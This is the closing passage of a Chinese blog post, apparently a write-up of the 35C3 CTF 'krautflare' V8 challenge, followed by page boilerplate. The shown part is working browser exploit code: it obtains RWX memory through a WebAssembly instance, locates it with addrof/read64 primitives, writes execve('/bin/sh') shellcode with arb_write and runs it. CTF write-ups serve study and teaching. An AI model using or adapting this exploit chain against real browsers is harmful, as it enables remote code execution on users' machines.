        let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
        let wasmModule = new WebAssembly.Module(wasmCode);
        let wasmInstance = new WebAssembly.Instance(wasmModule);

        let shellcodeFunc = wasmInstance.exports.main;

        let shellcodeAddr = addrof(shellcodeFunc);
        shellcodeAddr = read64(shellcodeAddr-1+8*3);
        shellcodeAddr = read64(shellcodeAddr-1+8*1);
        shellcodeAddr = read64(shellcodeAddr-1+8*2);
        shellcodeAddr = read64(shellcodeAddr-1+8*0x1d);
        return [shellcodeFunc, shellcodeAddr];
    },
    start : function(){
        let shellcodeObj = this.getRWXMem();
        let shellcodeAddr = shellcodeObj[1];
        let shellcodeFunc = shellcodeObj[0];

        let shellcode = &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x48\x31\xc0\xb0\x3b\x99\x4d\x31\xd2\x0f\x05&quot;;
        print(&quot;[*] Get RWX memory address : &quot;+hex(shellcodeAddr));
        print(&quot;[*] Injecting shellcode...&quot;);
        arb_write(shellcodeAddr, shellcode);
        print(&quot;[*] Remote code execute...&quot;);
        shellcodeFunc();
    }

};

pwn.start();
</code></pre>
<p>以上代码测试的时候因为带上了<code>--allow-natives-syntax</code>，所以一些偏移和不带参数的可能不太一样。</p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎联系作者指出任何有错误或不够清晰的表达。 </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>35C3 CTF krautflare exploit</p>
    
    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="7o8v">7o8v</a></p>
    <p><span class="copy-title">发布时间:</span>2019-10-30, 19:33:13</p>
    <p><span class="copy-title">最后更新:</span>2019-10-30, 19:37:54</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/30/35C3-CTF-krautflare-exploit/" title="35C3 CTF krautflare exploit">http://www.7o8v.me/2019/10/30/35C3-CTF-krautflare-exploit/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML">
</script>
<input type="hidden" id="MathJax-js"
        value="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML">
</input>
    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2019-2020 7o8v</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" href="javascript:void(0)"></a>
    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#Browser','#JavascriptEngine','#Chrome','#V8','#JavascriptCore','#Webkit',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    

    
</style>







</html>
